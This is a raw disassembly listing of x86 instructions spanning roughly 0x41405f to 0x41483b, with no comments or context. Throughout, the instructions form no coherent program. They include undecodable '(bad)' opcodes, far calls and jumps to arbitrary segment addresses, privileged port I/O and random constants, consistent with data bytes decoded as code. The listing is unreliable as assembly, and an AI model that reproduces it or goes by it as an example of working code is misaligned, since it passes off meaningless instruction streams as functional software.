  41405f:	(bad)  
  414060:	arpl   WORD PTR [esi-0x6b],ax
  414063:	sub    al,0x74
  414065:	loope  0x414003
  414067:	loop   0x41400b
  414069:	pop    ecx
  41406a:	jne    0x414003
  41406c:	imul   DWORD PTR [esi]
  41406e:	iret   
  41406f:	(bad)  
  414070:	mov    ebp,0x8ccfc28b
  414075:	jle    0x4140de
  414077:	int    0x53
  414079:	jae    0x4140f0
  41407b:	in     al,dx
  41407c:	xchg   ecx,eax
  41407d:	or     BYTE PTR [ebp-0x2d],0x75
  414081:	inc    ebx
  414082:	out    0xd1,eax
  414084:	pop    esi
  414085:	mov    ah,0x4d
  414087:	leave  
  414088:	arpl   WORD PTR [eax+0x4],si
  41408b:	stos   BYTE PTR es:[edi],al
  41408c:	or     BYTE PTR [ebp-0x4],cl
  41408f:	sub    eax,ebp
  414091:	sub    eax,0x49777dcc
  414096:	push   ebx
  414097:	popa   
  414098:	icebp  
  414099:	call   0x800:0x4757555b
  4140a0:	test   al,0x82
  4140a2:	push   ebp
  4140a3:	test   BYTE PTR [esi+0x4e],bl
  4140a6:	std    
  4140a7:	cmp    eax,0x581b69eb
  4140ac:	sub    dh,ch
  4140ae:	(bad)  
  4140af:	retf   0xdae7
  4140b2:	and    ch,BYTE PTR [esi-0x2429398a]
  4140b8:	enter  0xe5b8,0xc3
  4140bc:	fild   DWORD PTR [ecx]
  4140be:	cmp    eax,0x2817d346
  4140c3:	xchg   esp,eax
  4140c4:	mov    edx,DWORD PTR [ebx+esi*4]
  4140c7:	ins    DWORD PTR es:[edi],dx
  4140c8:	dec    eax
  4140ca:	mov    ecx,DWORD PTR [edi+0x3ba235d1]
  4140d0:	fwait
  4140d1:	dec    ecx
  4140d2:	(bad)  
  4140d3:	enter  0x7894,0x64
  4140d7:	stos   DWORD PTR es:[edi],eax
  4140d8:	jecxz  0x41409d
  4140da:	popf   
  4140db:	pushf  
  4140dc:	fcom   QWORD PTR [ecx-0x6eba9437]
  4140e2:	cdq    
  4140e3:	dec    esi
  4140e4:	pop    ecx
  4140e5:	stos   DWORD PTR es:[edi],eax
  4140e6:	imul   eax,ebx,0xffffffd3
  4140e9:	mov    dl,0x2b
  4140eb:	outs   dx,DWORD PTR ds:[esi]
  4140ec:	or     BYTE PTR [ecx],0x45
  4140ef:	ja     0x4140bd
  4140f1:	xor    esi,ecx
  4140f3:	cmp    edi,DWORD PTR [edi+0x75bff62b]
  4140f9:	push   ds
  4140fa:	dec    edi
  4140fb:	or     DWORD PTR ds:0xb8f235e7,edx
  414101:	daa    
  414102:	inc    edx
  414103:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  414105:	jge    0x4140b8
  414107:	fimul  WORD PTR [edx-0x700d4c00]
  41410d:	and    BYTE PTR [eax],0xd
  414110:	cmp    dl,BYTE PTR [edx+0x63]
  414113:	leave  
  414114:	dec    edi
  414115:	pop    edx
  414116:	inc    esp
  414117:	or     DWORD PTR [edi+0x4],edi
  41411a:	inc    esi
  41411b:	pop    ecx
  41411c:	sub    al,0xdc
  41411e:	and    eax,0xe0edc7c9
  414123:	sub    al,0x98
  414125:	in     eax,dx
  414126:	mov    ch,0xc7
  414128:	adc    cl,BYTE PTR cs:[eax]
  41412b:	cmp    edx,DWORD PTR [ebp-0x6bf445d8]
  414131:	mov    ds:0x8935f460,al
  414136:	test   BYTE PTR [esi+esi*8-0x21],dh
  41413a:	sbb    eax,0xce6802bc
  41413f:	fsincos 
  414141:	(bad)  
  414142:	cdq    
  414143:	inc    esp
  414144:	retf   
  414145:	sub    DWORD PTR [ebp+0x2c249857],edi
  41414b:	or     al,0x35
  41414d:	dec    ebx
  41414e:	stc    
  41414f:	stos   BYTE PTR es:[edi],al
  414150:	jmp    edi
  414152:	scas   eax,DWORD PTR es:[edi]
  414153:	rol    al,cl
  414155:	add    eax,0xc859b1d2
  41415a:	pushf  
  41415b:	pushf  
  41415c:	movnti DWORD PTR [esi],ecx
  41415f:	push   ebx
  414160:	mov    ch,0xc1
  414162:	jecxz  0x4140fc
  414164:	jnp    0x41419c
  414166:	inc    edx
  414167:	mov    bh,0x48
  414169:	ss mov dl,0x8b
  41416c:	fs mov esp,0x3e00091c
  414172:	lahf   
  414173:	and    DWORD PTR [edx+0x622ad856],esp
  414179:	and    BYTE PTR [ecx+0x6f],bh
  41417c:	push   esi
  41417d:	cmp    al,0xf1
  41417f:	pop    esp
  414180:	daa    
  414181:	ds mov cl,ch
  414184:	shl    DWORD PTR [edx],cl
  414186:	xchg   edi,eax
  414187:	adc    dl,BYTE PTR [ebx+eax*1]
  41418a:	dec    ebp
  41418b:	int    0x6
  41418d:	sbb    al,0x4a
  41418f:	in     al,dx
  414190:	jns    0x414197
  414192:	mov    dl,0x7a
  414194:	jg     0x414184
  414196:	sahf   
  414197:	add    eax,0xe2512316
  41419c:	std    
  41419d:	sar    DWORD PTR [eax+0x7c2b31c1],1
  4141a3:	cmp    al,0xef
  4141a5:	push   0x1285bac3
  4141aa:	and    DWORD PTR [edi],esp
  4141ac:	(bad)  
  4141ad:	imul   ebp,DWORD PTR [eax],0x6ca037d2
  4141b3:	adc    eax,0x9b6c9c82
  4141b8:	mov    WORD PTR [edi+edi*8],es
  4141bb:	dec    esp
  4141bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141bd:	mov    WORD PTR [esi-0x645a6517],?
  4141c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141c4:	pusha  
  4141c5:	out    dx,eax
  4141c6:	ins    DWORD PTR es:[edi],dx
  4141c7:	xor    DWORD PTR [edx],eax
  4141c9:	xchg   edx,eax
  4141ca:	push   ecx
  4141cb:	sbb    eax,0xa4be3b5a
  4141d0:	imul   edx,DWORD PTR [edi+eax*2],0xffffffd6
  4141d4:	jne    0x414208
  4141d6:	mov    ebx,0x13d32e64
  4141db:	rcl    edi,cl
  4141dd:	lahf   
  4141de:	das    
  4141df:	inc    esi
  4141e0:	xchg   esi,eax
  4141e1:	addr16 adc dl,BYTE PTR ds:0x1476
  4141e7:	jge    0x41418a
  4141e9:	cmp    DWORD PTR [esi+0x6681c94b],edi
  4141ef:	shl    BYTE PTR [eax-0x5a],cl
  4141f2:	icebp  
  4141f3:	ret    0x93bd
  4141f6:	daa    
  4141f7:	sbb    bl,BYTE PTR [edx+0x39667ba2]
  4141fd:	clc    
  4141fe:	repnz lock mov dl,0xb6
  414202:	enter  0x7390,0x3f
  414206:	gs rcl dh,cl
  414209:	test   DWORD PTR [ebx],ebp
  41420b:	xchg   ecx,eax
  41420c:	or     al,0xc6
  41420e:	ror    BYTE PTR [eax-0xdf4b420],0x34
  414215:	and    al,BYTE PTR ds:0x9d305e39
  41421b:	or     BYTE PTR [esi+ecx*2+0x3c],dh
  41421f:	jecxz  0x414267
  414221:	nop
  414222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414223:	or     al,0xb0
  414225:	loopne 0x41423c
  414227:	xchg   ebp,eax
  414228:	mov    bh,BYTE PTR [ebx-0x77]
  41422b:	in     al,dx
  41422c:	mov    ebp,0x363662f7
  414231:	inc    edi
  414232:	mov    WORD PTR [ebx-0x635f215d],?
  414238:	call   0xc94a438b
  41423d:	cmp    eax,0xa080fed9
  414242:	add    BYTE PTR ds:0x9a82987e,0x8a
  414249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41424a:	push   esp
  41424b:	in     eax,0x7b
  41424d:	mov    eax,ds:0x570d9e43
  414252:	cld    
  414253:	pop    eax
  414254:	sub    bl,BYTE PTR [esi]
  414256:	outs   dx,DWORD PTR ds:[esi]
  414257:	pop    ss
  414258:	inc    eax
  414259:	(bad)  
  41425a:	int3   
  41425b:	sub    edx,ebp
  41425d:	or     BYTE PTR [eax+0x184dcb5c],0x39
  414264:	push   eax
  414265:	ins    DWORD PTR es:[edi],dx
  414266:	add    bl,BYTE PTR [edx+0x52]
  414269:	cmp    bh,dh
  41426b:	add    al,0x10
  41426d:	jmp    0x4142b2
  41426f:	add    ecx,DWORD PTR [edx]
  414271:	repz call 0x6354e16b
  414277:	test   BYTE PTR [ebx],bh
  414279:	pop    edx
  41427a:	data16 jecxz 0x4142d9
  41427d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41427e:	(bad)  
  41427f:	(bad)  
  414280:	ss mov al,0x63
  414283:	(bad)  
  414284:	daa    
  414285:	bound  esi,QWORD PTR [ecx-0x5e6d0de8]
  41428b:	add    dh,BYTE PTR [ecx-0x37]
  41428e:	sbb    esi,ebx
  414290:	add    DWORD PTR [edi],ebp
  414292:	xor    eax,0xdce5cf4c
  414297:	pop    ebx
  414298:	mov    DWORD PTR [ebp-0x53],ebp
  41429b:	jp     0x41426d
  41429d:	stos   DWORD PTR es:[edi],eax
  41429e:	rol    DWORD PTR [esp+eiz*4-0x74],cl
  4142a2:	or     eax,0x2ef451bc
  4142a7:	pop    eax
  4142a8:	push   ecx
  4142a9:	test   eax,0x92e52aca
  4142ae:	inc    eax
  4142af:	and    al,0x86
  4142b1:	popf   
  4142b2:	fmul   DWORD PTR [eax+0x6b8e40fc]
  4142b8:	sbb    edi,DWORD PTR [edx-0x7a69fe1f]
  4142be:	sub    edx,DWORD PTR [esi]
  4142c0:	add    BYTE PTR [esi+0x6af96384],ah
  4142c6:	int    0x69
  4142c8:	or     edi,edi
  4142ca:	push   ebx
  4142cb:	cmp    esp,DWORD PTR [ebp+0x31b2a48e]
  4142d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142d2:	xchg   edi,eax
  4142d4:	pop    es
  4142d5:	push   0xc
  4142d7:	add    DWORD PTR [ebx+0x2f04d34c],esp
  4142dd:	out    0xa8,eax
  4142df:	lock xchg ebp,eax
  4142e1:	xor    DWORD PTR [ecx+0x32],ebx
  4142e4:	jno    0x414296
  4142e6:	mov    ds:0x784583cf,al
  4142eb:	scas   al,BYTE PTR es:[edi]
  4142ec:	mov    esi,0xa073cbcb
  4142f1:	pop    edx
  4142f2:	(bad)  
  4142f3:	icebp  
  4142f4:	rol    DWORD PTR [edi-0x1d],cl
  4142f7:	fld    TBYTE PTR [ecx]
  4142f9:	aas    
  4142fa:	ja     0x41435b
  4142fc:	xchg   ebx,eax
  4142fd:	xchg   esi,eax
  4142fe:	and    eax,0x1d8e2e05
  414303:	lds    ebx,FWORD PTR [edx+0x71]
  414306:	jmp    0x4142c0
  414308:	pop    eax
  414309:	mov    ds:0x8551d96e,al
  41430e:	shl    DWORD PTR [edx],0xa5
  414311:	jg     0x414317
  414313:	pop    esp
  414314:	jmp    0x414328
  414316:	ret    0x3c96
  414319:	int    0xdc
  41431b:	mov    ecx,0xe628b71b
  414320:	inc    edi
  414321:	dec    eax
  414322:	pop    ebp
  414323:	cmp    eax,0xcc12dbab
  414328:	add    al,0x2
  41432a:	mov    cl,0xa0
  41432c:	add    DWORD PTR [ebx],esi
  41432e:	push   ss
  41432f:	imul   esi,ebp,0xffffffe5
  414332:	jge    0x41436b
  414334:	push   ss
  414335:	sbb    edx,DWORD PTR [ecx-0x10e18cd4]
  41433b:	enter  0x2f83,0x6f
  41433f:	adc    dl,BYTE PTR [ecx+edx*8+0x3f]
  414343:	dec    ebx
  414344:	mov    dl,BYTE PTR [edi+ebp*8]
  414347:	mov    bh,0x64
  414349:	icebp  
  41434a:	fistp  WORD PTR [ebx+0x19]
  41434d:	ins    BYTE PTR es:[edi],dx
  41434e:	dec    eax
  41434f:	ins    DWORD PTR es:[edi],dx
  414350:	iret   
  414351:	push   eax
  414352:	push   ds
  414353:	fs shr ebp,1
  414356:	dec    edi
  414357:	mov    dh,0xd3
  414359:	out    dx,al
  41435a:	dec    edx
  41435b:	mov    bl,0xaf
  41435d:	xchg   ecx,eax
  41435e:	pop    esp
  41435f:	pop    ebp
  414360:	and    bh,BYTE PTR [eax]
  414362:	retf   
  414363:	gs push cs
  414365:	or     eax,0xbaf13201
  41436a:	mov    bl,0x7c
  41436c:	push   ebx
  41436d:	jae    0x414370
  41436f:	outs   dx,DWORD PTR ds:[esi]
  414370:	fwait
  414371:	xchg   ecx,eax
  414372:	dec    ebp
  414373:	es popf 
  414375:	push   cs
  414376:	inc    edx
  414377:	adc    dh,BYTE PTR [eax]
  414379:	adc    al,0x60
  41437b:	inc    edx
  41437c:	loope  0x4143be
  41437e:	retf   0x173c
  414381:	inc    esp
  414382:	add    BYTE PTR [ebp+ecx*4-0x66],bl
  414386:	rcr    BYTE PTR [ebx-0x1d407545],0x92
  41438d:	mov    DWORD PTR ds:0xcfd8dfbd,ebx
  414393:	jae    0x414390
  414395:	stos   DWORD PTR es:[edi],eax
  414396:	ja     0x4143ff
  414398:	or     al,0xc9
  41439a:	mov    cl,0xcf
  41439c:	and    bl,BYTE PTR [edi-0x14530124]
  4143a2:	mov    BYTE PTR [ebp+0x4a9b25cd],0xbe
  4143a9:	test   DWORD PTR [ebp-0x5c498ed9],edi
  4143af:	dec    ecx
  4143b0:	pop    eax
  4143b1:	add    edi,DWORD PTR [esi+0x53a2cb7d]
  4143b7:	cmp    BYTE PTR [ebx+0x16],bl
  4143ba:	adc    al,0x10
  4143bc:	stos   DWORD PTR es:[edi],eax
  4143bd:	outs   dx,BYTE PTR ds:[esi]
  4143be:	push   cs
  4143bf:	cwde   
  4143c0:	imul   eax,DWORD PTR [edi-0x1c27fa5a],0x3286a4ec
  4143ca:	in     al,dx
  4143cb:	jge    0x414387
  4143cd:	inc    ebp
  4143ce:	rcl    BYTE PTR [esi],cl
  4143d0:	es add eax,0x11a88418
  4143d6:	fisubr WORD PTR [ebp+0x6e]
  4143d9:	xlat   BYTE PTR ds:[ebx]
  4143da:	das    
  4143db:	xchg   edi,eax
  4143dc:	xor    esp,DWORD PTR [edi]
  4143de:	shl    DWORD PTR [ecx-0x1ee36e26],0xbb
  4143e5:	xchg   ecx,eax
  4143e6:	sbb    ecx,ebp
  4143e8:	jge    0x414421
  4143ea:	sahf   
  4143eb:	lahf   
  4143ec:	ins    BYTE PTR es:[edi],dx
  4143ed:	mov    BYTE PTR [esi],0x85
  4143f0:	stc    
  4143f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143f2:	mov    ds:0xa9748f23,eax
  4143f7:	sti    
  4143f8:	int    0x59
  4143fa:	mov    ch,0xef
  4143fc:	fistp  DWORD PTR [ebx+eiz*4-0x43809821]
  414403:	in     eax,dx
  414404:	hlt    
  414405:	rcr    DWORD PTR [edx],1
  414407:	push   eax
  414408:	rcr    DWORD PTR [ebp-0x4e],cl
  41440b:	inc    esp
  41440c:	push   ds
  41440d:	fidiv  DWORD PTR [edi+0x1c]
  414410:	cmp    eax,0xdeb53297
  414415:	pop    edx
  414416:	push   esi
  414417:	cmp    al,0xa2
  414419:	jle    0x414476
  41441b:	scas   eax,DWORD PTR es:[edi]
  41441c:	mov    cl,0x16
  41441e:	sbb    ebx,DWORD PTR [esi-0x37174c6f]
  414424:	mov    al,0xcd
  414426:	ja     0x4143b4
  414428:	and    al,0xd5
  41442a:	out    0x8b,eax
  41442c:	lods   eax,DWORD PTR ds:[esi]
  41442d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41442e:	mov    ds:0x5048dd2d,eax
  414433:	pop    ecx
  414434:	call   DWORD PTR [edi+0xd909e9c]
  41443a:	test   esp,ecx
  41443c:	inc    edx
  41443d:	ds xchg edi,eax
  41443f:	outs   dx,DWORD PTR ds:[esi]
  414440:	rcr    BYTE PTR [ebp+0x57],1
  414443:	imul   ebx,DWORD PTR [esi-0x5c3ffa],0xa1b6844b
  41444d:	xchg   ebx,eax
  41444e:	mov    edi,0x33487361
  414453:	mov    gs,WORD PTR [eax+0x5debc039]
  414459:	nop
  41445a:	(bad)  
  41445b:	cmc    
  41445c:	scas   al,BYTE PTR es:[edi]
  41445d:	push   0xc9a28224
  414462:	xor    ebx,eax
  414464:	add    eax,0x5e33af
  414469:	sub    BYTE PTR [edi-0x5a7b98f],0xf9
  414470:	mov    BYTE PTR [ecx+0x4b],bh
  414473:	notrack jmp DWORD PTR [edi+edi*2]
  414477:	or     DWORD PTR [edi-0x207f0c32],0xd0205463
  414481:	in     eax,0xcd
  414483:	jle    0x4144ef
  414485:	stc    
  414486:	sub    DWORD PTR [esi+eax*2+0x37],esp
  41448a:	loopne 0x4144b4
  41448c:	inc    ebx
  41448d:	add    bl,cl
  41448f:	push   ebx
  414490:	ret    0x6bf
  414493:	xor    eax,0x37b225e1
  414498:	xchg   ebp,eax
  414499:	icebp  
  41449a:	test   al,0xf1
  41449c:	jl     0x414505
  41449e:	mov    ds:0x626dc6d9,al
  4144a3:	push   es
  4144a4:	sahf   
  4144a5:	mov    eax,ds:0xaa4e8731
  4144aa:	and    dh,BYTE PTR [ebx]
  4144ac:	xor    DWORD PTR [ebx+0x1c],edi
  4144af:	mov    eax,ds:0x7672e0a7
  4144b4:	jb     0x414455
  4144b6:	arpl   WORD PTR [edi],ax
  4144b8:	popa   
  4144b9:	in     al,0xde
  4144bb:	retf   
  4144bc:	and    BYTE PTR [ecx],dl
  4144be:	loopne 0x4144b8
  4144c0:	inc    eax
  4144c1:	into   
  4144c2:	nop
  4144c3:	or     ecx,DWORD PTR [edx]
  4144c5:	and    cl,bh
  4144c7:	cmp    edx,ebp
  4144c9:	jle    0x4144f7
  4144cb:	or     al,al
  4144cd:	retf   0xb8ec
  4144d0:	or     al,0xdf
  4144d2:	mov    bh,0x1c
  4144d4:	das    
  4144d5:	mov    eax,0x4ab8bddf
  4144da:	jl     0x414553
  4144dc:	stos   DWORD PTR es:[edi],eax
  4144dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144de:	add    al,0x81
  4144e0:	ins    DWORD PTR es:[edi],dx
  4144e1:	dec    ebx
  4144e2:	jp     0x414547
  4144e4:	sbb    eax,0xd7a50bc5
  4144e9:	mov    cs,esi
  4144eb:	mov    al,ds:0xfc5b798f
  4144f0:	mov    ds:0x3ecc95c,eax
  4144f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144f6:	jecxz  0x414546
  4144f8:	repz ror BYTE PTR [eax*8+0x5005904],cl
  414500:	imul   DWORD PTR [ecx+0x33]
  414503:	mov    bh,0xf4
  414505:	mov    ah,0x20
  414507:	inc    edi
  414508:	ja     0x41449f
  41450a:	push   eax
  41450b:	jo     0x414560
  41450d:	sub    cl,BYTE PTR [ebp+0x7f]
  414510:	pop    esi
  414511:	imul   esp,DWORD PTR [edx-0x6c],0x468ae5de
  414518:	sbb    al,0x51
  41451a:	cmp    eax,0x113cabd9
  41451f:	call   0x7a19:0xc7f984e2
  414526:	mov    ch,0xf2
  414528:	std    
  414529:	aas    
  41452a:	cs loop 0x414502
  41452d:	mov    edx,0x7fbf6ae5
  414532:	jle    0x41459f
  414534:	or     eax,0x6f1a93a4
  414539:	xchg   esp,eax
  41453a:	popa   
  41453b:	stc    
  41453c:	ja     0x4144fd
  41453e:	aas    
  41453f:	bound  edx,QWORD PTR [ecx+0x595e36e3]
  414545:	call   0xdb8db399
  41454a:	dec    edx
  41454b:	mov    BYTE PTR [ecx+0x2f3a4ef6],bl
  414551:	pop    ebx
  414552:	pop    esp
  414553:	aad    0x6d
  414555:	ds addr16 cdq 
  414558:	add    DWORD PTR [ebp-0x6e851942],ebx
  41455e:	add    bl,BYTE PTR [ecx-0x79fde588]
  414564:	mov    ds:0x823e8fb4,eax
  414569:	fisubr DWORD PTR [eax]
  41456b:	rcl    DWORD PTR [esi+ebx*2+0xc129b79],cl
  414572:	hlt    
  414573:	fimul  DWORD PTR [esp+eax*8]
  414576:	jge    0x414589
  414578:	and    al,0xa
  41457a:	iret   
  41457b:	pop    ecx
  41457c:	cdq    
  41457d:	enter  0x711e,0xb5
  414581:	ins    BYTE PTR es:[edi],dx
  414582:	aas    
  414583:	jge    0x414534
  414585:	sbb    eax,0x7b99258b
  41458a:	and    DWORD PTR [ecx+0x7c056f91],eax
  414590:	call   0x8b391672
  414595:	xchg   ebp,eax
  414596:	test   BYTE PTR [esi],bl
  414598:	and    dh,BYTE PTR [edi+0x725b350]
  41459e:	dec    ecx
  41459f:	outs   dx,DWORD PTR ds:[esi]
  4145a0:	jb     0x4145bc
  4145a2:	sbb    DWORD PTR [edx],esi
  4145a4:	mov    al,ds:0x8bc794a2
  4145a9:	inc    edi
  4145aa:	ins    DWORD PTR es:[edi],dx
  4145ab:	add    edi,DWORD PTR [edi+0x19]
  4145ae:	lods   eax,DWORD PTR ds:[esi]
  4145af:	scas   al,BYTE PTR es:[edi]
  4145b0:	xor    bl,BYTE PTR [eax+ebx*4]
  4145b3:	sub    eax,0x6edbea39
  4145b8:	xchg   bl,cl
  4145ba:	inc    ecx
  4145bb:	and    bl,BYTE PTR [ebx+eiz*4]
  4145be:	lock add al,0xcb
  4145c1:	test   BYTE PTR [ecx+0x76658f29],0x64
  4145c8:	xchg   esi,eax
  4145c9:	ds loope 0x4145af
  4145cc:	pop    ebx
  4145cd:	mov    al,ds:0x710f101c
  4145d2:	gs mov edx,0x9c01e935
  4145d8:	sub    eax,0x98d65867
  4145dd:	fld    TBYTE PTR [esi+0x4c]
  4145e0:	sti    
  4145e1:	dec    edi
  4145e2:	jp     0x4145a3
  4145e4:	pop    esp
  4145e5:	fist   WORD PTR [ebx]
  4145e7:	push   0xffffffe6
  4145e9:	sub    BYTE PTR [eax],0x38
  4145ec:	mov    esi,0x9975ffbc
  4145f1:	adc    eax,0xa6f39dc0
  4145f6:	fstp   QWORD PTR [ecx-0x71]
  4145f9:	jecxz  0x41467a
  4145fb:	mov    ah,0xb7
  4145fd:	and    BYTE PTR [edx+0x16ad1608],ch
  414603:	push   edi
  414604:	dec    esi
  414605:	xor    al,0xde
  414607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414608:	(bad)
  41460c:	or     DWORD PTR [edx+0x115a7368],0x1bdc5f43
  414616:	inc    esi
  414617:	pop    ecx
  414618:	bound  ebx,QWORD PTR [eax+0x37]
  41461b:	mov    WORD PTR [eax-0x5],cs
  41461e:	push   cs
  41461f:	push   ss
  414620:	push   0x69
  414622:	test   eax,0x4abe5d68
  414627:	repnz push esi
  414629:	hlt    
  41462a:	rcl    BYTE PTR [edx],0x40
  41462d:	mov    eax,ds:0x53abc34a
  414632:	pop    edx
  414633:	sub    eax,0x19f4d45e
  414638:	mov    edx,0x23258ee
  41463d:	in     al,0x62
  41463f:	xlat   BYTE PTR ds:[ebx]
  414640:	imul   ebx,DWORD PTR [eax+edx*8+0x8],0x6
  414645:	test   al,0xee
  414647:	imul   esi,DWORD PTR [edx-0x3de52263],0xffffffad
  41464e:	pushf  
  41464f:	mov    ds:0x88d2611b,eax
  414654:	mov    eax,ds:0xe43961fb
  414659:	adc    ebp,edx
  41465b:	aaa    
  41465c:	jmp    0x760f:0xc3aca28b
  414663:	rcl    DWORD PTR [eax+0x46bdf12b],cl
  414669:	sub    eax,0xd1799e2b
  41466e:	int3   
  41466f:	cmp    eax,0x9a19ea0d
  414674:	xchg   dl,bl
  414676:	sbb    esi,edx
  414678:	pop    eax
  414679:	stos   DWORD PTR es:[edi],eax
  41467a:	jmp    0x8c5973df
  41467f:	pop    es
  414680:	mov    esp,0x2affe16c
  414685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414686:	pop    eax
  414687:	and    al,0x87
  414689:	push   cs
  41468a:	shr    cl,cl
  41468c:	mov    esi,DWORD PTR [edi-0x528e1dca]
  414692:	or     dh,bl
  414694:	sub    DWORD PTR [ebx-0xb],eax
  414697:	cmp    esp,edx
  414699:	js     0x41469a
  41469b:	jb     0x414623
  41469d:	in     eax,dx
  41469e:	pop    ds
  41469f:	or     bh,BYTE PTR [esi+0x5d6b8ce2]
  4146a5:	dec    esp
  4146a6:	outs   dx,BYTE PTR ds:[esi]
  4146a7:	in     al,0xe4
  4146a9:	sub    ebx,edi
  4146ab:	cmp    ecx,DWORD PTR [edi-0xa]
  4146ae:	sub    al,0xe7
  4146b0:	jnp    0x414638
  4146b2:	and    eax,0x7f04a13b
  4146b7:	sbb    eax,0x74f9b71e
  4146bc:	das    
  4146bd:	cmp    dl,BYTE PTR [ebx+0x67]
  4146c0:	mov    cl,0xf5
  4146c2:	(bad)  
  4146c3:	mov    eax,ds:0xe3735afb
  4146c8:	(bad)  
  4146c9:	cmp    al,0x60
  4146cb:	inc    esp
  4146cc:	jg     0x41474a
  4146ce:	fild   QWORD PTR [edx-0x1a]
  4146d1:	xchg   ebp,eax
  4146d2:	and    ebx,DWORD PTR [esi+0xc197110]
  4146d8:	jbe    0x414748
  4146da:	and    DWORD PTR [esp+esi*8+0x5b],ebx
  4146de:	in     al,0xf4
  4146e0:	lds    edi,FWORD PTR [ebp+ecx*4-0x1f38a9ec]
  4146e7:	dec    ebp
  4146e8:	int    0xaa
  4146ea:	inc    ebx
  4146eb:	add    eax,edx
  4146ed:	adc    ecx,DWORD PTR [edi+eax*1+0x2c]
  4146f1:	mov    ebx,0x2cc9bc28
  4146f6:	clc    
  4146f7:	sti    
  4146f8:	dec    edx
  4146f9:	retf   
  4146fa:	cdq    
  4146fb:	or     al,0xbd
  4146fd:	mov    edi,0xa9f5eb8c
  414702:	into   
  414703:	lahf   
  414704:	out    0x7c,al
  414706:	(bad)  
  414708:	jmp    0x1304:0x2552a6e2
  41470f:	pop    edi
  414710:	adc    DWORD PTR [eax-0x39],esp
  414713:	adc    eax,0xa03d4d20
  414718:	xchg   edi,eax
  414719:	mov    ds:0xd4810b6e,eax
  41471e:	add    DWORD PTR [ebx+0x40],edi
  414721:	jl     0x41478e
  414723:	cdq    
  414724:	mov    ebp,0xe9f426a0
  414729:	call   0x6c68:0xd9e6a639
  414730:	(bad)  
  414731:	pop    esp
  414732:	adc    al,0xdf
  414734:	or     eax,edx
  414736:	dec    esp
  414737:	push   0xa6fb4a0c
  41473c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41473d:	inc    ebp
  41473e:	popa   
  41473f:	xchg   esp,eax
  414740:	inc    esi
  414741:	lods   al,BYTE PTR ds:[esi]
  414742:	stos   DWORD PTR es:[edi],eax
  414743:	jp     0x414731
  414745:	sbb    cl,BYTE PTR [ebx]
  414747:	adc    bl,BYTE PTR [ebx+0x24]
  41474a:	dec    esp
  41474b:	aam    0x72
  41474d:	and    BYTE PTR [ebx+0x64],cl
  414750:	int    0x25
  414752:	xor    DWORD PTR [edx+eax*2],ebx
  414755:	inc    ebp
  414756:	ss adc eax,0x2a2ac0c4
  41475c:	mov    eax,0xa49b9ce
  414761:	(bad)  
  414763:	(bad)  
  414764:	and    ah,BYTE PTR [esi]
  414766:	sub    eax,DWORD PTR [eax+0x20]
  414769:	mov    ecx,0x86d2446d
  41476e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41476f:	lea    edi,[edx+0x4fce97a7]
  414775:	out    0xdf,eax
  414777:	add    dl,BYTE PTR [edx-0x54f7425c]
  41477d:	inc    ebp
  41477e:	add    DWORD PTR [ecx-0x797d82f8],0x6438c9a6
  414788:	mov    ebp,0x9eb0eabb
  41478d:	pop    edi
  41478e:	jge    0x414750
  414790:	cmp    ch,BYTE PTR [edi+0x150e494e]
  414796:	adc    ebp,DWORD PTR [ecx-0x6c984a12]
  41479c:	cld    
  41479d:	mov    dh,BYTE PTR [eax]
  41479f:	aas    
  4147a0:	inc    esp
  4147a1:	addr16 cmc 
  4147a3:	or     eax,0x79f71493
  4147a8:	cmc    
  4147a9:	call   0x448b:0x181f5a0d
  4147b0:	rol    BYTE PTR [eax-0x2d81f5ab],0xc2
  4147b7:	push   0x48
  4147b9:	in     eax,dx
  4147ba:	jae    0x414816
  4147bc:	cmp    DWORD PTR [ebx-0x543fd530],eax
  4147c2:	xchg   esi,eax
  4147c3:	inc    ebx
  4147c4:	lahf   
  4147c5:	call   0x2df90281
  4147ca:	scas   eax,DWORD PTR es:[edi]
  4147cb:	inc    esp
  4147cc:	in     eax,0x12
  4147ce:	fdivr  DWORD PTR fs:[edi+0x2d67be69]
  4147d5:	xor    ch,al
  4147d7:	call   0x6bb0:0x5db67cdf
  4147de:	add    esp,DWORD PTR [ebp+0x33]
  4147e1:	jecxz  0x414843
  4147e3:	ret    
  4147e4:	xor    edi,0xffffff8c
  4147e7:	and    DWORD PTR [esi+0x19],edx
  4147ea:	mov    ebp,0x412743d5
  4147ef:	inc    esp
  4147f0:	inc    edi
  4147f1:	sub    DWORD PTR [ebx],eax
  4147f3:	aas    
  4147f4:	(bad)  
  4147f5:	dec    ebp
  4147f6:	stc    
  4147f7:	(bad)  
  4147f8:	cwde   
  4147f9:	dec    DWORD PTR [esi+0x899c06f]
  4147ff:	dec    ebx
  414800:	gs out dx,al
  414802:	xchg   esi,eax
  414803:	inc    esi
  414804:	sbb    al,0x7d
  414806:	cwde   
  414807:	int    0xf8
  414809:	lahf   
  41480a:	push   0xf9a20baf
  41480f:	hlt    
  414810:	inc    edi
  414811:	dec    ecx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	ret    0x26c
  414816:	pusha  
  414817:	js     0x4147ff
  414819:	push   esi
  41481a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41481b:	fstp   st(4)
  41481d:	lds    edx,FWORD PTR [ebx+0x7a]
  414820:	cmp    bl,BYTE PTR [eax+ebp*1]
  414823:	fild   QWORD PTR [ebp+0x986e73e]
  414829:	push   edx
  41482a:	stos   DWORD PTR es:[edi],eax
  41482b:	mov    edi,0xb6dd5102
  414830:	das    
  414831:	cdq    
  414832:	cs call 0xd310:0x145cc5bb
  41483a:	inc    edx
  41483b:	test   al,0xae
